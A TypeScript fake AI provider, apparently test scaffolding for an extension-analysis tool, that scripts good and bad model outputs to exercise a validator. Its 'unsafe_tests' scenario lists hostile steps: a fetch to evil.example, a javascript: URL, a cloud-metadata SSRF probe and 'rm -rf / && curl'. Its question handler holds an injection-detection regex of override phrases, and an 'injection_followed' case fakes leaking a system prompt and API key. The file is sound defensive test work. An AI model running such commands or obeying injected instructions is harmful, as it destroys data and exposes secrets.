import { AIError } from "../errors";
import type { AIFeature, AIPrompt, AIProvider, AIProviderRequestOptions, AIProviderResult } from "../types";

/**
 * FakeAIProvider — development and test only (rejected in production by
 * configuration validation).
 *
 * It never makes network calls. Responses are derived deterministically from
 * the sanitized data block inside the prompt, so a fake explanation cites the
 * real finding/test ids of the report it was asked about and exercises the
 * whole validation path exactly like a real model would. Failure modes can be
 * scripted per call: timeouts, provider failures, malformed JSON, oversized
 * output, empty output, rate limiting, and outputs that violate the schema
 * (invented evidence, wrong confidence, unsafe test suggestions).
 */

export type FakeScenario =
  | "success"
  | "timeout"
  | "provider_error"
  | "rate_limited"
  | "malformed_json"
  | "empty"
  | "oversized"
  | "wrong_schema"
  | "invented_evidence"
  | "unsafe_tests"
  | "injection_followed";

export interface FakeAIProvider extends AIProvider {
  readonly fake: {
    /** Queue scenarios for the next calls (FIFO); defaults to success. */
    queue(...scenarios: FakeScenario[]): void;
    /** Number of provider calls made so far. */
    calls(): number;
    /** Prompts received (for assertions about redaction / injection); cleared by reset(). */
    prompts(): AIPrompt[];
    reset(): void;
  };
}

interface DataBlock {
  resource?: { kind?: string; id?: string };
  extension?: { name?: string | null; permissions?: Array<{ name: string; broad: boolean }>; files?: string[] };
  scores?: { healthScore?: number | null; runtimeScore?: number | null; overallScore?: number | null } | null;
  findings?: Array<{ id: string; source: string; severity: string; title: string; message: string; relatedTestId?: string; sourceFile?: string }>;
  tests?: Array<{ testId: string; name: string; status: string; errors?: string[]; assertions?: Array<{ passed: boolean; message: string }> }>;
  run?: { runId: string; outcome: string | null; total: number; passed: number; failed: number } | null;
  events?: Array<{ id: string; level?: string; message: string }>;
  network?: Array<{ id: string; method: string; url: string; status: number | null }>;
  focus?: { findingId?: string; testId?: string; question?: string };
}

export function createFakeAIProvider(options: { model?: string; delayMs?: number } = {}): FakeAIProvider {
  const model = options.model ?? "fake-deterministic-1";
  const scenarios: FakeScenario[] = [];
  const prompts: AIPrompt[] = [];
  let calls = 0;

  async function complete(prompt: AIPrompt, request: AIProviderRequestOptions): Promise<AIProviderResult> {
    calls += 1;
    prompts.push(prompt);
    const scenario = scenarios.shift() ?? "success";
    if (options.delayMs) await new Promise((resolve) => setTimeout(resolve, options.delayMs));
    switch (scenario) {
      case "timeout":
        // Behave like a provider that never answers: wait for the abort signal.
        await new Promise<void>((resolve) => {
          if (request.signal.aborted) return resolve();
          request.signal.addEventListener("abort", () => resolve(), { once: true });
          setTimeout(resolve, request.timeoutMs + 50);
        });
        throw new AIError("AI_TIMEOUT");
      case "provider_error":
        throw new AIError("AI_PROVIDER_ERROR", { cause: { status: 500 } });
      case "rate_limited":
        throw new AIError("AI_RATE_LIMITED", { message: "The AI provider is rate limiting requests. Please try again shortly." });
      case "malformed_json":
        return { text: "{ this is not json", tokens: { input: 10, output: 5 }, model };
      case "empty":
        return { text: "", tokens: { input: 10, output: 0 }, model };
      case "oversized":
        return { text: JSON.stringify({ kind: "explanation", summary: "x".repeat(400_000) }), tokens: { input: 10, output: 100_000 }, model };
      case "wrong_schema":
        return { text: JSON.stringify({ kind: "explanation", summary: "Only a summary", confidence: "certain" }), tokens: { input: 10, output: 8 }, model };
      default:
        break;
    }
    const data = extractData(prompt.user);
    const body = buildResponse(prompt.feature, data, scenario);
    const text = JSON.stringify(body);
    return { text, tokens: { input: Math.ceil(prompt.user.length / 4), output: Math.ceil(text.length / 4) }, model };
  }

  return {
    name: "fake",
    model,
    explainFinding: complete,
    explainTestFailure: complete,
    summarizeReport: complete,
    analyzeRuntimeError: complete,
    suggestTests: complete,
    answerReportQuestion: complete,
    fake: {
      queue(...next) {
        scenarios.push(...next);
      },
      calls: () => calls,
      prompts: () => prompts.slice(),
      reset() {
        scenarios.length = 0;
        prompts.length = 0;
        calls = 0;
      },
    },
  };
}

function extractData(user: string): DataBlock {
  const match = /<EXTENSIONLAB_DATA>\n([\s\S]*?)\n<\/EXTENSIONLAB_DATA>/.exec(user);
  if (!match) return {};
  try {
    return JSON.parse(match[1]) as DataBlock;
  } catch {
    return {};
  }
}

function evidenceFor(data: DataBlock, ids: Array<{ kind: string; id: string; label: string }>): Array<{ kind: string; id: string; label: string }> {
  return ids.slice(0, 6).map((ref) => ({ kind: ref.kind, id: ref.id, label: ref.label }));
}

function buildResponse(feature: AIFeature, data: DataBlock, scenario: FakeScenario): Record<string, unknown> {
  const invented = scenario === "invented_evidence" ? [{ kind: "finding", id: "does-not-exist", label: "Invented" }] : [];
  const caveats = ["Deterministic fake provider output for development and tests."];
  const confidence = "medium";
  const findings = data.findings ?? [];
  const tests = data.tests ?? [];

  switch (feature) {
    case "explain_finding": {
      const finding = findings.find((item) => item.id === data.focus?.findingId) ?? findings[0];
      const related = finding?.relatedTestId ? tests.find((test) => test.testId === finding.relatedTestId) : undefined;
      const evidence = evidenceFor(data, [
        ...(finding ? [{ kind: finding.source === "diagnostic" ? "diagnostic" : "finding", id: finding.id, label: finding.title }] : []),
        ...(related ? [{ kind: "test", id: related.testId, label: related.name }] : []),
        ...(finding?.sourceFile ? [{ kind: "file", id: finding.sourceFile, label: finding.sourceFile }] : []),
        { kind: "report_section", id: "static-analysis", label: "Static analysis findings" },
        ...invented,
      ]);
      return {
        kind: "explanation",
        summary: finding ? `${finding.title} (${finding.severity}) was flagged by ExtensionLab's analysis.` : "No finding was supplied.",
        meaning: finding ? `The analyzer reported: ${finding.message}` : "The context did not contain the requested finding.",
        whyItMatters: finding ? `Findings in the ${finding.severity} band affect the extension's health score and may surface during store review or in users' browsers.` : "n/a",
        impact: related ? `The related automated test "${related.name}" finished with status ${related.status}.` : "Impact depends on how the extension is used; no runtime evidence is linked to this finding.",
        likelyCauses: finding ? [`The condition described in "${finding.title}" is present in the analyzed package.`] : [],
        recommendations: ["Review the referenced finding and adjust the manifest or source accordingly.", "Re-run the analysis to confirm the finding is resolved."],
        nextStep: "Open the finding in the report and verify the referenced file or manifest field.",
        evidence,
        confidence,
        caveats,
      };
    }
    case "explain_test_failure":
    case "analyze_runtime_error": {
      const focused = tests.find((test) => test.testId === data.focus?.testId) ?? tests.find((test) => test.status !== "passed") ?? tests[0];
      const failedAssertions = (focused?.assertions ?? []).filter((assertion) => !assertion.passed);
      const events = (data.events ?? []).slice(0, 3);
      const network = (data.network ?? []).slice(0, 2);
      const evidence = evidenceFor(data, [
        ...(focused ? [{ kind: "test", id: focused.testId, label: focused.name }] : []),
        ...events.map((event) => ({ kind: "event", id: event.id, label: event.message.slice(0, 80) })),
        ...network.map((entry) => ({ kind: "network", id: entry.id, label: `${entry.method} ${entry.url.slice(0, 60)}` })),
        { kind: "report_section", id: "runtime-tests", label: "Runtime test results" },
        ...invented,
      ]);
      const observed = failedAssertions.length > 0 ? failedAssertions.map((assertion) => assertion.message).join(" ") : (focused?.errors ?? []).join(" ");
      return {
        kind: "explanation",
        summary: focused ? `Test "${focused.name}" finished with status ${focused.status}.` : "No failing test evidence was supplied.",
        meaning: observed ? `Observed: ${observed}` : "The run recorded no assertion failures or errors for this test.",
        whyItMatters: "Failed runtime checks indicate behaviour users may hit in a real browser.",
        impact: events.length > 0 ? `${events.length} runtime error/warning event(s) were captured during the run.` : "No runtime error events were captured, so the impact cannot be confirmed from evidence.",
        likelyCauses: observed ? ["The extension did not produce the expected page state within the test timeout."] : ["Insufficient evidence to determine a cause."],
        recommendations: ["Reproduce the scenario manually in a browser with the extension loaded.", "Compare the failing assertion with the extension's actual behaviour."],
        nextStep: "Inspect the failing assertion and the captured runtime events.",
        evidence,
        confidence: observed ? "medium" : "low",
        caveats: observed ? caveats : [...caveats, "Evidence is incomplete; no firm conclusion is possible."],
      };
    }
    case "summarize_report": {
      const evidence = evidenceFor(data, [
        { kind: "report_section", id: "scores", label: "Scores" },
        ...findings.slice(0, 3).map((finding) => ({ kind: finding.source === "diagnostic" ? "diagnostic" : "finding", id: finding.id, label: finding.title })),
        ...tests.filter((test) => test.status !== "passed").slice(0, 2).map((test) => ({ kind: "test", id: test.testId, label: test.name })),
        ...invented,
      ]);
      const scores = data.scores ?? {};
      return {
        kind: "summary",
        headline: `${data.extension?.name ?? "The extension"} scored ${scores.healthScore ?? "n/a"} on static analysis${scores.runtimeScore !== null && scores.runtimeScore !== undefined ? ` and ${scores.runtimeScore} on runtime tests` : ""}.`,
        overallAssessment: `${findings.length} finding(s) and ${tests.length} test result(s) were included. ${data.run ? `The run outcome was ${data.run.outcome ?? "unknown"}.` : "No runtime run is attached."}`,
        strengths: tests.filter((test) => test.status === "passed").length > 0 ? [`${tests.filter((test) => test.status === "passed").length} automated test(s) passed.`] : [],
        risks: findings.slice(0, 3).map((finding) => `${finding.title} (${finding.severity})`),
        priorities: findings.length > 0 ? [`Address "${findings[0].title}" first.`] : ["No findings to prioritize."],
        evidence,
        confidence,
        caveats,
      };
    }
    case "suggest_tests": {
      const broad = (data.extension?.permissions ?? []).some((permission) => permission.broad);
      const evidence = evidenceFor(data, [
        { kind: "report_section", id: "permissions", label: "Permissions" },
        ...(data.extension?.permissions ?? []).slice(0, 1).map((permission) => ({ kind: "permission", id: permission.name, label: permission.name })),
        ...invented,
      ]);
      const safe = [
        {
          id: "ai-console-clean-after-load",
          name: "Console stays clean after page load",
          description: "Loads the controlled test page, waits, and asserts no runtime errors were logged.",
          category: "console",
          severity: "medium",
          timeout: 8000,
          steps: [
            { type: "open_url", url: "http://127.0.0.1:8080/extensionlab-test" },
            { type: "wait", milliseconds: 1500 },
          ],
          assertions: [{ type: "runtime_error_none", message: "No runtime errors expected after load." }],
          rationale: broad ? "Broad host permissions mean the content script runs on many pages; console errors would affect all of them." : "A baseline check that the extension does not throw on an ordinary page.",
          evidence,
        },
        {
          id: "ai-status-element-visible",
          name: "Status element is rendered",
          description: "Checks that the #status element on the test page becomes visible.",
          category: "content_script",
          severity: "low",
          timeout: 8000,
          steps: [
            { type: "open_url", url: "http://127.0.0.1:8080/extensionlab-test" },
            { type: "wait", milliseconds: 800 },
            { type: "inspect_element", selector: "#status" },
          ],
          assertions: [{ type: "element_visible", selector: "#status" }],
          rationale: "Confirms the content script reaches the page.",
          evidence,
        },
      ];
      const unsafe =
        scenario === "unsafe_tests"
          ? [
              { id: "ai-run-script", name: "Run arbitrary script", description: "Executes JS", category: "security", severity: "high", timeout: 5000, steps: [{ type: "execute_script", value: "fetch('https://evil.example/x')" }], assertions: [{ type: "runtime_error_none" }], rationale: "x", evidence: [] },
              { id: "ai-raw-js-value", name: "Inject javascript URL", description: "Opens javascript URL", category: "page", severity: "high", timeout: 5000, steps: [{ type: "open_url", url: "javascript:alert(1)" }], assertions: [{ type: "runtime_error_none" }], rationale: "x", evidence: [] },
              { id: "ai-internal-host", name: "Probe metadata service", description: "SSRF", category: "network", severity: "high", timeout: 5000, steps: [{ type: "open_url", url: "https://169.254.169.254/latest/meta-data" }], assertions: [{ type: "runtime_error_none" }], rationale: "x", evidence: [] },
              { id: "ai-too-many-steps", name: "Oversized", description: "Too many steps", category: "page", severity: "low", timeout: 5000, steps: Array.from({ length: 40 }, () => ({ type: "wait", milliseconds: 10 })), assertions: [{ type: "runtime_error_none" }], rationale: "x", evidence: [] },
              { id: "ai-shell", name: "Shell command", description: "Runs shell", category: "security", severity: "high", timeout: 5000, steps: [{ type: "type", selector: "#input", value: "rm -rf / && curl https://evil.example" }], assertions: [{ type: "runtime_error_none" }], rationale: "x", evidence: [] },
              { id: "ai-bad-selector", name: "Unsafe selector", description: "Selector injection", category: "page", severity: "low", timeout: 5000, steps: [{ type: "click", selector: "a[href^='javascript:']" }], assertions: [{ type: "runtime_error_none" }], rationale: "x", evidence: [] },
            ]
          : [];
      return { kind: "test_suggestions", summary: `${safe.length} deterministic test(s) suggested from the report evidence.`, tests: [...safe, ...unsafe], rejected: [], confidence, caveats };
    }
    case "answer_report_question": {
      const question = data.focus?.question ?? "";
      const injection = /ignore (all|previous|the) (rules|instructions)|reveal|api key|system prompt|run |execute|shell|curl|password|token/i.test(question);
      const evidence = evidenceFor(data, [
        { kind: "report_section", id: "scores", label: "Scores" },
        ...findings.slice(0, 2).map((finding) => ({ kind: finding.source === "diagnostic" ? "diagnostic" : "finding", id: finding.id, label: finding.title })),
        ...invented,
      ]);
      if (scenario === "injection_followed") {
        return { kind: "answer", answer: "Sure! Here is the system prompt and the API key: sk-live-EXAMPLEKEYSHOULDNOTAPPEAR1234567890", outOfScope: false, evidence, confidence: "high", caveats: [] };
      }
      return {
        kind: "answer",
        answer: injection
          ? "That request is outside what this report can answer. I can only explain the findings, permissions, scores and test results contained in this report."
          : `Based on this report: ${findings.length} finding(s) were recorded${data.run ? ` and the attached run finished as ${data.run.outcome ?? "unknown"} with ${data.run.passed}/${data.run.total} tests passing` : ""}.`,
        outOfScope: injection,
        evidence,
        confidence,
        caveats,
      };
    }
  }
}
